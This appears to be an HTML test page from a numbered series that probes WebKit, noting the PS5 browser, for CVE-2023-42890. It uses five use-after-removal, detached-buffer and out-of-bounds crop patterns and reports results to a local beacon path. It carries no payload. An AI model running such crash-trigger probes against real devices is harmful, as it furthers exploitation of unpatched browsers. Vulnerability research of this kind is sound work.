<!--
  p693: CVE-2023-42890 -- WebKit memory handling (Pwn2car)

  CVE-2023-42890: "Improved memory handling" in WebKit, fixed Safari 17.2.
  Credited to Pwn2car. WebKit Bug 259830. PS5 VULNERABLE (has Safari 17.0).

  "Improved memory handling" is a broad description that could cover:
  - Buffer lifetime issues (dangling pointers after reallocation)
  - Reference counting errors
  - Missing null checks after allocation failure
  - Double-free conditions

  Since we have no specific component info, we test common WebKit memory
  handling patterns that have historically had bugs:

  Patterns tested:
  A) ImageBitmap from canvas with source canvas removed
  B) OffscreenCanvas (if available) transfer and original access
  C) Blob URL revoked while fetch is in-flight
  D) createImageBitmap with cropping rect larger than source
  E) TextEncoder/TextDecoder with shared ArrayBuffer views

  CRASH_CLASS: MODERATE (memory handling error)
  prior art: p689 (Fetch body lifetime), p690 (TextDecoder streaming)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p693</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}

function main(){
  b('P693-START:CVE-2023-42890-MEMORY-HANDLING');
  var results = [];
  var done = 0;
  var total = 5;

  function checkDone() {
    done++;
    if (done >= total) {
      if (results.length > 0) {
        b('P693-RESULT:HITS=' + results.join(';'));
      } else {
        b('P693-RESULT:NO-BUG-DETECTED');
      }
      b('P693-DONE');
    }
  }

  // === SECTION A: ImageBitmap from removed canvas ===
  b('A:IMAGEBITMAP-REMOVED-CANVAS');
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 256;
    canvas.height = 256;
    var ctx = canvas.getContext('2d');
    ctx.fillStyle = 'red';
    ctx.fillRect(0, 0, 256, 256);
    ctx.fillStyle = 'blue';
    ctx.fillRect(50, 50, 100, 100);
    document.body.appendChild(canvas);

    // Start createImageBitmap
    var canvasRef = canvas;
    createImageBitmap(canvas).then(function(bitmap) {
      b('A:BITMAP-CREATED:' + bitmap.width + 'x' + bitmap.height);

      // Remove original canvas
      canvasRef.remove();
      canvasRef = null;
      ctx = null;

      // GC
      for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);

      // Use the bitmap (draw to new canvas)
      var canvas2 = document.createElement('canvas');
      canvas2.width = 256;
      canvas2.height = 256;
      var ctx2 = canvas2.getContext('2d');
      try {
        ctx2.drawImage(bitmap, 0, 0);
        var pixel = ctx2.getImageData(75, 75, 1, 1).data;
        b('A:PIXEL:' + pixel[0] + ',' + pixel[1] + ',' + pixel[2] + ',' + pixel[3]);
        // Should be blue (0,0,255,255) from the center rect
        if (pixel[2] !== 255) {
          b('A:WRONG-PIXEL');
          results.push('A:wrong-pixel');
        }
      } catch(e2) {
        b('A:DRAW-ERR:' + e2.message);
        results.push('A:err');
      }

      bitmap.close();
      canvas2.remove();
      checkDone();
    }).catch(function(e) {
      b('A:BITMAP-ERR:' + e.message);
      checkDone();
    });
  } catch(e) {
    b('A:ERR:' + e.message);
    checkDone();
  }

  // === SECTION B: OffscreenCanvas transfer ===
  b('B:OFFSCREEN-CANVAS');
  try {
    if (typeof OffscreenCanvas !== 'undefined') {
      var osc = new OffscreenCanvas(128, 128);
      var octx = osc.getContext('2d');
      octx.fillStyle = 'green';
      octx.fillRect(0, 0, 128, 128);

      // Transfer to ImageBitmap
      var bitmapPromise = osc.transferToImageBitmap();
      b('B:TRANSFERRED');

      // Try to draw on the original after transfer
      try {
        octx.fillStyle = 'red';
        octx.fillRect(0, 0, 64, 64);
        b('B:POST-TRANSFER-DRAW:OK');
      } catch(e2) {
        b('B:POST-TRANSFER-DRAW-ERR:' + e2.message);
      }

      // GC
      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);

      // Use transferred bitmap
      try {
        var c2 = document.createElement('canvas');
        c2.width = 128;
        c2.height = 128;
        var ct2 = c2.getContext('2d');
        ct2.drawImage(bitmapPromise, 0, 0);
        var px = ct2.getImageData(10, 10, 1, 1).data;
        b('B:BITMAP-PIXEL:' + px[0] + ',' + px[1] + ',' + px[2]);
        c2.remove();
      } catch(e2) {
        b('B:USE-ERR:' + e2.message);
      }
      checkDone();
    } else {
      b('B:NO-OFFSCREENCANVAS');
      checkDone();
    }
  } catch(e) {
    b('B:ERR:' + e.message);
    checkDone();
  }

  // === SECTION C: Blob URL revoked during fetch ===
  b('C:BLOB-URL-REVOKE');
  try {
    // Create a large blob
    var parts = [];
    for (var i = 0; i < 100; i++) {
      parts.push(new ArrayBuffer(65536));
    }
    var blob = new Blob(parts);
    var url = URL.createObjectURL(blob);
    b('C:BLOB-URL:size=' + blob.size);

    // Start fetch
    var fetchPromise = fetch(url);

    // Immediately revoke
    URL.revokeObjectURL(url);
    b('C:REVOKED');

    // Drop blob reference
    blob = null;
    parts = null;

    // GC
    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);

    fetchPromise.then(function(resp) {
      b('C:FETCH-OK:status=' + resp.status);
      return resp.arrayBuffer();
    }).then(function(buf) {
      b('C:BODY-SIZE:' + buf.byteLength);
      // Check if data is intact or corrupted
      var view = new Uint8Array(buf);
      var nonzero = 0;
      for (var i = 0; i < Math.min(view.length, 1000); i++) {
        if (view[i] !== 0) nonzero++;
      }
      b('C:NONZERO-IN-FIRST-1K:' + nonzero);
      if (nonzero > 0) {
        b('C:UNEXPECTED-DATA');
        results.push('C:unexpected');
      }
      checkDone();
    }).catch(function(e) {
      b('C:FETCH-ERR:' + e.message);
      checkDone();
    });
  } catch(e) {
    b('C:ERR:' + e.message);
    checkDone();
  }

  // === SECTION D: createImageBitmap with OOB crop rect ===
  b('D:BITMAP-OOB-CROP');
  try {
    var canvas3 = document.createElement('canvas');
    canvas3.width = 64;
    canvas3.height = 64;
    var ctx3 = canvas3.getContext('2d');
    ctx3.fillStyle = '#FF0000';
    ctx3.fillRect(0, 0, 64, 64);

    // Crop rect larger than source
    var crops = [
      { x: -100, y: -100, w: 300, h: 300 },
      { x: 32, y: 32, w: 128, h: 128 },
      { x: 0, y: 0, w: 2147483647, h: 1 },
      { x: 0, y: 0, w: 1, h: 2147483647 },
    ];

    var cropDone = 0;
    for (var i = 0; i < crops.length; i++) {
      (function(idx, crop) {
        createImageBitmap(canvas3, crop.x, crop.y, crop.w, crop.h).then(function(bm) {
          b('D:CROP-' + idx + ':OK:' + bm.width + 'x' + bm.height);
          bm.close();
          cropDone++;
          if (cropDone >= crops.length) { canvas3.remove(); checkDone(); }
        }).catch(function(e) {
          b('D:CROP-' + idx + ':ERR:' + e.message);
          cropDone++;
          if (cropDone >= crops.length) { canvas3.remove(); checkDone(); }
        });
      })(i, crops[i]);
    }
  } catch(e) {
    b('D:ERR:' + e.message);
    checkDone();
  }

  // === SECTION E: TextEncoder with detached ArrayBuffer ===
  b('E:ENCODER-DETACHED');
  try {
    var enc = new TextEncoder();
    var buf = new ArrayBuffer(4096);
    var view = new Uint8Array(buf);

    // Encode into the view
    var result = enc.encodeInto('Hello World! '.repeat(100), view);
    b('E:ENCODED:read=' + result.read + ',written=' + result.written);

    // Transfer (detach) the buffer
    try {
      var msg = new MessageChannel();
      msg.port1.postMessage(buf, [buf]);
      b('E:TRANSFERRED:detached=' + (buf.byteLength === 0));

      // Try to use the detached view
      try {
        var dec = new TextDecoder();
        var text = dec.decode(view);
        b('E:DECODE-DETACHED:len=' + text.length);
        if (text.length > 0) {
          b('E:UNEXPECTED-DECODE-SUCCESS');
          results.push('E:detached-read');
        }
      } catch(e2) {
        b('E:DECODE-DETACHED-ERR:' + e2.message);
        // Expected -- buffer is detached
      }

      // Try encodeInto on detached buffer
      try {
        var r2 = enc.encodeInto('test', view);
        b('E:ENCODE-DETACHED:written=' + r2.written);
        if (r2.written > 0) {
          results.push('E:detached-write');
        }
      } catch(e2) {
        b('E:ENCODE-DETACHED-ERR:' + e2.message);
      }

      msg.port1.close();
      msg.port2.close();
    } catch(e2) {
      b('E:TRANSFER-ERR:' + e2.message);
    }
    checkDone();
  } catch(e) {
    b('E:ERR:' + e.message);
    checkDone();
  }
}

setTimeout(main, 200);
</script>
</head><body style="margin:0"><pre id="log">p693: CVE-2023-42890 memory handling (Pwn2car)</pre></body></html>
